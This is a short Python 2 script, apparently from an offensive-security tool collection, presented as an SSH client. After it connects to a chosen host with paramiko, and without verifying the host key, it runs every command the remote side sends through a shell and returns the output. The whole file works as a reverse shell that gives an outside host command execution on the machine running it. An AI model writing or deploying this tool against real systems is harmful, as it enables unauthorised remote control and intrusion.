#!/usr/bin/env python

__author__ = "bt3gl"


import paramiko
import sys
import getopt
import subprocess

def usage():
    print "Usage: ssh_client.py  <IP> -p <PORT> -u <USER> -c <COMMAND> -a <PASSWORD>"
    print "  -a                  password authentication"
    print "  -p                  specify the port"
    print "  -u                  specify the username"
    print
    print "Examples:"
    print "ssh_client.py localhost -u buffy -p 22 -a killvampires"
    sys.exit()


def ssh_client(ip, port, user, passwd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        print ssh_session.recv(1024)
        while 1:
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception, e:
                ssh_session.send(str(e))
        client.close()


def main():

    if not len(sys.argv[1:]):
        usage()

    # parse the arguments
    IP = '0.0.0.0'
    USER = ''
    PASSWORD = ''
    PORT = 0

    try:
        opts = getopt.getopt(sys.argv[2:],"p:u:a:", \
            ["PORT", "USER", "PASSWORD"])[0]
    except getopt.GetoptError as err:
        print str(err)
        usage()

    # Get user and ip
    IP = sys.argv[1]
    print "[*] Initializing connection to " + IP

    # Handle the options and arguments
    for t in opts:
        if t[0] in ('-a'):
            PASSWORD = t[1]
        elif t[0] in ('-p'):
            PORT = int(t[1])
        elif t[0] in ('-u'):
            USER = t[1]
        else:
            print "This option does not exist!"
            usage()

    if USER:
        print "[*] User set to " + USER
    if PORT:
        print "[*] The port to be used is %d. " % PORT
    if PASSWORD:
        print "[*] A password with length %d was submitted. " %len(PASSWORD)

    # start the client
    ssh_client(IP, PORT, USER, PASSWORD)


if __name__ == '__main__':
    main()
